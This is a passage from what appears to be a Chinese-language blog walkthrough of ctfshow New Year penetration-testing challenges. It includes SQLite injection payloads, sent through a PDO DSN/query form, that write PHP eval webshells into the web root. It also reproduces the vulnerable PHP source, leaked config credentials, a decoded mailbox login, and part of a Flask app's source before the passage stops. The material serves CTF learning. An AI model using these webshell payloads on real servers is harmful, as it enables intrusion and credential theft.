class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现 config.php 和 index.php 在同一个目录</p><p>hint：</p><blockquote><p>&amp;<br>sqlite是可以不用账号密码的<br>必须有真实的表结构，才能文件落地</p></blockquote><p>本地写一个pdo查询测一下</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:test.php&amp;query&#x3D;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY,&#39;&lt;?php phpinfo();?&gt;&#39; TEXT NOT NULL,email TEXT NOT NULL,created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191146898.png" alt="image-20250105191146898"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250105191653338.png" alt="image-20250105191653338"></p><p>能写，接下来尝试打远程</p><p>需要url编码：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是所有人都卡在了接收不到参数上。。</p><p>于是到了6号下午，这个时候数据库有回显了，果然是环境有问题（</p><p>需要先生成一个完整表结构的文件：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.db%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试写马（第二段payload需要php用<code>exec</code>才能写马）</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,&#39;&lt;?php%20phpinfo();?&gt;&#39;%20TEXT%20NOT%20NULL);?dsn&#x3D;sqlite:user.db%26query&#x3D;ATTACH%2BDATABASE%2B%22%2Fvar%2Fwww%2Fhtml%2Fcmd%2Ephp%22%2BAS%2Bshell%3Bcreate%2BTABLE%2Bshell%2Eexp%2B%28payload%2Btext%29%3Binsert%2BINTO%2Bshell%2Eexp%2B%28payload%29%2BVALUES%28%22%3C%3F%3Deval%28%24%5FGET%5B0%5D%29%3B%22%29%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>能生成文件，但是访问返回500，猜测和 sqlite 那堆字符有关，得写一个干净的shell</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>琢磨了半天群主直接给payload了：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">%3fdsn&#x3D;sqlite:shell.php%26username&#x3D;aaa%26password&#x3D;bbb%26query&#x3D;create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);?&gt;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时访问shell.php虽然接口服务会报500，但是已经生成了1.php</p><p>然后就getshell了</p><p>读config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//数据库连接配置</span><span class="token variable">$database_host</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$database_user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$database_password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5"</span><span class="token punctuation">;</span><span class="token variable">$database_name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web_db_2"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pdo</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database init faild"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">!==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"数据库连接失败："</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$stmt</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"数据库操作失败："</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104003437954.png" alt="image-20250104003437954"></p><p>？浏览器插件里出现了个数字，看了一下是从网页js来的，试一下居然秒了</p><p>flag：<code>ctfshow&#123;81192&#125;</code></p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>根目录下有 &#x2F;secret.txt，是一串base，解码得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hacker_ctfshow@163.com/Hacker_ctfsh0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网易云邮箱的账密这是，应该是可以直接登录得到邮件的</p><hr><h1 id="第四章（Flask）"><a href="#第四章（Flask）" class="headerlink" title="第四章（Flask）"></a>第四章（Flask）</h1><h2 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195537953.png" alt="image-20250103195537953"></p><p>在 172.2.xxx.6:8888 开的 flask</p><p>审一下源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    